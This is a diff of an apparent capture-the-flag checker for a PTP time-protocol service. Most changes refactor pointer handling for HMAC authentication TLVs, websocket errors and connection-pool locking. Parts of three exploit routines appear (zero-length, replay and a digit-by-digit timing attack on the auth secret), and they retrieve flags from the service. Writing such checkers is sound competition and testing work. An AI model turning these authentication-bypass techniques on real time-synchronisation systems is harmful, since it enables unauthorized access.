@@ -194,12 +194,12 @@ class UdpConnection:
         return response
 
     def send(self, message, port):
-        request = message.encode(self.BUFFER_SIZE)
+        request, _ = message.encode(self.BUFFER_SIZE)
         self.send_raw(request, port)
 
     async def receive(self, port):
         response = await self.receive_raw(port)
-        message = ptp_message.from_buffer(response)
+        message, _ = ptp_message.from_buffer(response)
 
         self.logger.debug(f"Decoded received message (type: {message.decoded.type}, seqno: {message.decoded.sequence_id}, port_id: {encode_port_id(message.decoded.port_id.clock_id, message.decoded.port_id.port)}, flags: {message.decoded.flags:x}, tlvs: {len(message.get_tlvs())})")
 
@@ -235,8 +235,12 @@ class WsConnection:
         self.client = client
         self.logger = logger
 
-    async def send(self, message: str):        
-        await self.client.send(message)
+    async def send(self, message: str):
+        try:
+            await self.client.send(message)
+        except websockets.exceptions.ConnectionClosed:
+            raise OfflineException("Websocket connection closed")
+
         self.logger.debug(f"Sent websocket message: {message}")
 
     async def receive(self) -> str:        
@@ -318,12 +322,12 @@ class WsClientPool:
             else:
                 self.logger.debug(f"Reusing websocket client to {host}")
 
-            await lock.acquire()
+        await lock.acquire()
 
-            try:
-                yield client
-            finally:
-                lock.release()
+        try:
+            yield client
+        finally:
+            lock.release()
 
     async def cleanup(self):
         while True:
@@ -334,7 +338,7 @@ class WsClientPool:
                 for host in list(self.clients):
                     for entry in self.clients[host][:]:
                         client, lock, timeout = entry
-                        if now > timeout:
+                        if now > timeout and not lock.locked():
                             async with lock:
                                 await client.close()
                                 self.clients[host].remove(entry)
@@ -387,30 +391,32 @@ def add_auth_tlv(message, policy: str, icv_length=None):
     else:
         raise InternalErrorException(f"Unknown policy {policy}")
     
-def finalize_auth_tlv(tlv, request, secret=b"", icv=None):
+def finalize_auth_tlv(tlv, request_pointer, secret=b"", icv=None):
     if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
         return
+    
+    buffer_address = ptp_protocol.ffi.cast("uint8_t *", request_pointer)
+    icv_address = ptp_protocol.ffi.cast("uint8_t *", tlv.payload.authentication.icv)
 
-    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
-    icv_address = tlv.payload.authentication.icv
+    icv_offset = icv_address - buffer_address
     
     if tlv.payload.authentication.policy == policy_to_int("hmac"):
         if icv is None:
-            icv = hmac.new(secret, bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()
+            icv = hmac.new(secret, pointer_to_bytes(buffer_address, icv_offset), hashlib.sha256).digest()
     elif tlv.payload.authentication.policy == policy_to_int("plain"):
-        icv = secret + b'\0'
+        icv = secret + b'\0' * (tlv.payload.authentication.icv_length - len(secret))
     else:
         raise InternalErrorException(f"Unknown policy in finalize")
 
     ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)
 
-def finalize_auth_tlvs(request, secret=b"", icv=None):
-    message = ptp_message.from_buffer(request)
+def finalize_auth_tlvs(request_pointer, length, secret=b"", icv=None):
+    message = ptp_message.from_pointer(request_pointer, length)
 
     for tlv in message.get_tlvs():
-        finalize_auth_tlv(tlv, request, secret, icv)
+        finalize_auth_tlv(tlv, request_pointer, secret, icv)
 
-def check_auth_tlv_hmac(tlv, response, secret):
+def check_auth_tlv_hmac(tlv, response_pointer, secret):
     if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
         return False
     
@@ -420,11 +426,13 @@ def check_auth_tlv_hmac(tlv, response, secret):
     if tlv.payload.authentication.icv_length != 16:
         raise MumbleException("Invalid ICV length in authentication TLV")
 
-    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(response)))
-    icv_address = tlv.payload.authentication.icv
-    icv = hmac.new(secret, bytearray(response)[:icv_address - buffer_address], hashlib.sha256).digest()
+    buffer_address = ptp_protocol.ffi.cast("uint8_t *", response_pointer)
+    icv_address = ptp_protocol.ffi.cast("uint8_t *", tlv.payload.authentication.icv)
 
-    supplied_icv = ptp_protocol.ffi.buffer(tlv.payload.authentication.icv, 16)[:]
+    icv_offset = icv_address - buffer_address
+    icv = hmac.new(secret, pointer_to_bytes(response_pointer, icv_offset), hashlib.sha256).digest()
+
+    supplied_icv = pointer_to_bytes(tlv.payload.authentication.icv, 16)
 
     if supplied_icv != icv[:16]:
         raise MumbleException("Invalid ICV in authentication TLV")
@@ -432,14 +440,16 @@ def check_auth_tlv_hmac(tlv, response, secret):
     return True
 
 def check_auth_tlvs_hmac(response, secret):
-    message = ptp_message.from_buffer(response)
+    message, response_pointer = ptp_message.from_buffer(response)
 
     for tlv in message.get_tlvs():
-        if check_auth_tlv_hmac(tlv, response, secret):
+        if check_auth_tlv_hmac(tlv, response_pointer, secret):
             return
         
     raise MumbleException("No authentication TLV in response") 
 
+def pointer_to_bytes(pointer, length):
+    return ptp_protocol.ffi.buffer(pointer, length)[:]
 
 """
 Functionality functions
@@ -545,8 +555,9 @@ async def get_user_description(connection: UdpConnection, logger: LoggerAdapter,
     tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
 
     add_auth_tlv(message, policy)
-    request = message.encode(connection.BUFFER_SIZE)
-    finalize_auth_tlvs(request, secret=secret)
+    request, request_pointer = message.encode(connection.BUFFER_SIZE)
+    finalize_auth_tlvs(request_pointer, len(request), secret=secret)
+    request = pointer_to_bytes(request_pointer, len(request))
 
     [response] = await connection.transaction(request, GENERAL_PORT, send_raw=True)
 
@@ -555,7 +566,7 @@ async def get_user_description(connection: UdpConnection, logger: LoggerAdapter,
     for tlv in response.get_tlvs():
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
             if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_description = ptp_protocol.ffi.buffer(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)[:]
+                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
             if expect_error:
                 return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
@@ -633,8 +644,9 @@ async def request_unicast_message(connection: UdpConnection, logger: LoggerAdapt
     tlv.payload.request_unicast.duration = 0
 
     add_auth_tlv(message, policy)
-    request = message.encode(connection.BUFFER_SIZE)
-    finalize_auth_tlvs(request, secret=secret)
+    request, request_pointer = message.encode(connection.BUFFER_SIZE)
+    finalize_auth_tlvs(request_pointer, len(request), secret=secret)
+    request = pointer_to_bytes(request_pointer, len(request))
 
     [signaling_response, actual_response] = await connection.transaction(request, EVENT_PORT, responses=2, send_raw=True)
 
@@ -1175,7 +1187,7 @@ async def exploit_zerolength(
     for tlv in response.get_tlvs():
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
             if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_description = ptp_protocol.ffi.buffer(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)[:]
+                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                 received_flag = decode_flag(received_description, logger, True)
                 logger.info(f"Received flag {received_flag}")
 
@@ -1231,7 +1243,7 @@ async def exploit_replay(
     for tlv in response.get_tlvs():
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
             if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_description = ptp_protocol.ffi.buffer(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)[:]
+                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                 received_flag = decode_flag(received_description, logger, True)
                 logger.info(f"Received flag {received_flag}")
                 
@@ -1274,8 +1286,9 @@ async def exploit_timing(
     tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
     tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
     
-    request = message.encode(connection.BUFFER_SIZE)
-    message = ptp_message.from_buffer(request)
+    request, request_pointer = message.encode(connection.BUFFER_SIZE)
+    request_size = len(request)
+    message = ptp_message.from_pointer(request_pointer, request_size)
 
     secret = bytearray()
 
@@ -1295,13 +1308,14 @@ async def exploit_timing(
                     continue
 
                 character = string.digits[i_request].encode("ascii")
-                finalize_auth_tlv(tlv, request, secret + character)
+                finalize_auth_tlv(tlv, request_pointer, secret + character)
 
                 if j >= 1:
                     i_request += 1
                 
                 j += 1
 
+            request = pointer_to_bytes(request_pointer, request_size)
             [response] = await connection.transaction(request, GENERAL_PORT, send_raw=True)            
 
             if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
@@ -1313,7 +1327,7 @@ async def exploit_timing(
                     continue
 
                 if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                    received_description = ptp_protocol.ffi.buffer(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)[:]
+                    received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                     received_flag = decode_flag(received_description, logger, True)                    
                     return None, None, received_flag
                 elif tlv.payload.management.id != ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
